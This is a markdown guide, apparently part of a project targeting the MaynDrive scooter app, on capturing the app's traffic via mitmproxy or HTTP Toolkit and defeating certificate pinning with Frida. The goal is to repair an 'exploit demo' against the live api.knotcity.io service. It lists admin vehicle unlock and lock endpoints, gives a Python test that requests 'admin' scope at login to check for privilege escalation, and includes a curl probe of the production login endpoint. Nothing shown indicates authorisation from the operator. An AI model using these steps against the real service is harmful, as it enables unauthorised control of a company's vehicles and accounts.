# Phone Traffic Analysis Guide

## Why You Need This

The exploit demo is getting "Bad Gateway" errors because it's calling `https://api.knotcity.io` which appears to be:
- Down or temporarily offline
- Blocking automated requests
- Requiring additional headers/parameters we don't know about

**Solution:** Capture real traffic from the MaynDrive app on your phone to see the ACTUAL endpoints and parameters.

---

## Quick Setup (Recommended Method)

### Option 1: HTTP Toolkit (Easiest)

1. **Download HTTP Toolkit**
   - Visit: https://httptoolkit.tech/
   - Install on your computer

2. **Connect Your Android Phone**
   - Open HTTP Toolkit
   - Click "Android Device via ADB"
   - Connect phone via USB
   - Enable USB Debugging on phone:
     - Settings → About Phone → Tap "Build Number" 7 times
     - Settings → Developer Options → Enable "USB Debugging"

3. **Capture Traffic**
   - HTTP Toolkit will auto-configure your phone
   - Open MaynDrive app
   - Login and perform actions:
     - ✓ Login
     - ✓ View nearby scooters
     - ✓ Unlock a scooter (if possible)
     - ✓ View vehicle details
     - ✓ Lock scooter
   - All API calls will appear in HTTP Toolkit!

4. **Export Captured Traffic**
   - In HTTP Toolkit, click "Export"
   - Save as HAR file: `mayndrive_traffic.har`

---

### Option 2: mitmproxy (Advanced)

If you're comfortable with command line:

```bash
# 1. Install mitmproxy
pip install mitmproxy

# 2. Start mitmweb (web interface)
mitmweb -p 8080

# 3. Configure your phone's WiFi proxy
# - Connect phone to same WiFi as computer
# - Find your computer's IP: ipconfig (Windows) or ifconfig (Linux/Mac)
# - On phone: Settings → WiFi → Long press network → Modify → Proxy Manual
# - Hostname: <your-computer-ip>
# - Port: 8080

# 4. Install mitmproxy certificate
# - On phone, open browser and go to: http://mitm.it
# - Download and install Android certificate

# 5. Open mitmweb in browser: http://localhost:8081
# - Open MaynDrive app on phone
# - All traffic appears in mitmweb!

# 6. Save traffic
mitmdump -r ~/.mitmproxy/flows -w mayndrive_traffic.flow
```

---

## If You Get Certificate Pinning Errors

The MaynDrive app might reject your proxy's certificate. To bypass:

### Using Frida (SSL Unpinning)

```bash
# 1. Install Frida tools
pip install frida-tools

# 2. Download frida-server for Android
# Visit: https://github.com/frida/frida/releases
# Download the version matching your Android architecture (arm64 usually)

# 3. Push to phone
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server"
adb shell "su -c /data/local/tmp/frida-server &"

# 4. Run SSL unpinning script (already in your project!)
frida -U -f city.knot.mayndrive -l ssl-unpinning.js --no-pause

# 5. Now use mitmproxy/HTTP Toolkit as normal
```

---

## Analyzing Captured Traffic

Once you have captured traffic, use the analyzer script:

```bash
# Convert HAR to JSON (if needed)
python traffic_analyzer.py mayndrive_traffic.har

# Or analyze mitmproxy flows
mitmdump -r mayndrive_traffic.flow -w mayndrive_traffic.json
python traffic_analyzer.py mayndrive_traffic.json
```

### What to Look For:

1. **Actual API Base URL**
   ```
   Is it really: https://api.knotcity.io ?
   Or could it be: https://api.knotcity.io/v1/ ?
   Or: https://mayndrive-api.knotcity.io ?
   ```

2. **Required Headers**
   ```
   User-Agent: Knot-mayndrive v1.1.34 (android)
   X-API-Key: ??? (might be required)
   X-Device-ID: ??? (might be required)
   X-Platform: android
   Authorization: Bearer <token>
   ```

3. **Login Endpoint**
   ```json
   POST /api/application/login
   {
     "email": "...",
     "password": "...",
     "device": {
       "uuid": "...",
       "platform": "android",
       ...
     },
     "scope": "user"  // Can we change this to "admin"?
   }
   ```

4. **Admin Endpoints**
   ```
   POST /api/application/vehicles/unlock/admin
   POST /api/application/vehicles/freefloat/lock/admin
   POST /api/application/vehicles/freefloat/identify/admin
   GET  /api/application/vehicles/sn/{serial}/admin
   GET  /api/application/vehicles/sn/{serial}/admin-refresh
   ```

5. **Response Format**
   ```json
   {
     "access_token": "...",
     "refresh_token": "...",
     "expires_in": 3600,
     "scope": "user"  // Does this come back as "admin" if we request it?
   }
   ```

---

## Update the API Client

After capturing real traffic, update `mayn_drive_api.py`:

### 1. Fix Base URL (if different)
```python
ENVIRONMENTS = {
    'production': 'https://api.knotcity.io',  # Update if wrong
    'production_v2': 'https://api.knotcity.io/v2',  # Add if needed
    ...
}
```

### 2. Add Missing Headers (if found)
```python
self.session.headers.update({
    'User-Agent': 'Knot-mayndrive v1.1.34 (android)',
    'Content-Type': 'application/json',
    'Accept': 'application/json',
    'X-API-Key': 'YOUR_API_KEY_IF_NEEDED',  # Add if required
    'X-Platform': 'android'  # Add if required
})
```

### 3. Fix Endpoint Paths (if different)
```python
# If the real endpoint is different:
# OLD: '/api/application/vehicles/unlock/admin'
# NEW: '/api/v2/application/vehicles/unlock/admin'

def unlock_vehicle_admin(self, ...):
    success, data = self._make_request(
        'POST', 
        '/api/v2/application/vehicles/unlock/admin',  # Updated
        json_data=payload
    )
```

---

## Testing the Updated API

After making changes based on captured traffic:

```python
# Test with your own credentials
from mayn_drive_api import MaynDriveAPI

api = MaynDriveAPI()
success, data = api.login("your.email@example.com", "your_password")

if success:
    print("✅ Login successful!")
    print(f"Token: {api.access_token}")
    
    # Try admin scope
    api2 = MaynDriveAPI()
    success, data = api2.login("your.email@example.com", "your_password", scope="admin")
    
    if success:
        print("🚨 VULNERABLE! Admin scope accepted!")
    else:
        print("✅ Admin scope rejected")
else:
    print(f"❌ Login failed: {data}")
```

---

## What You'll Discover

By analyzing phone traffic, you'll learn:

1. ✅ **Exact API endpoints** - No more guessing
2. ✅ **Required headers** - Know what's mandatory
3. ✅ **Authentication flow** - How tokens really work
4. ✅ **Request/response formats** - Exact JSON schemas
5. ✅ **Admin endpoints availability** - Do they exist? Are they protected?
6. ✅ **Vulnerability confirmation** - Can you really request admin scope?

---

## Quick Test Right Now

You can test if the API is even reachable:

```bash
# Test from command line
curl -v https://api.knotcity.io/api/application/login \
  -H "Content-Type: application/json" \
  -H "User-Agent: Knot-mayndrive v1.1.34 (android)" \
  -d '{"email":"test@test.com","password":"test"}'

# If you get 502 Bad Gateway → API is down
# If you get 401 Unauthorized → API is up but credentials wrong (GOOD!)
# If you get 404 Not Found → Endpoint path is wrong
```

---

## Summary

**Current Problem:** Production API at `https://api.knotcity.io` is unreachable

**Solution:** 
1. Capture real traffic from MaynDrive app on your phone
2. Verify actual endpoints and parameters
3. Update `mayn_drive_api.py` with correct details
4. Re-run exploit demo with real data

**Tools You Already Have:**
- ✅ `MITM_PROXY_SETUP.md` - Full proxy setup guide
- ✅ `ssl-unpinning.js` - Bypass certificate pinning
- ✅ `traffic_analyzer.py` - Analyze captured traffic
- ✅ All exploit scripts ready to test

**Next Step:** Choose HTTP Toolkit (easiest) or mitmproxy (advanced) and capture that traffic! 📱🔍

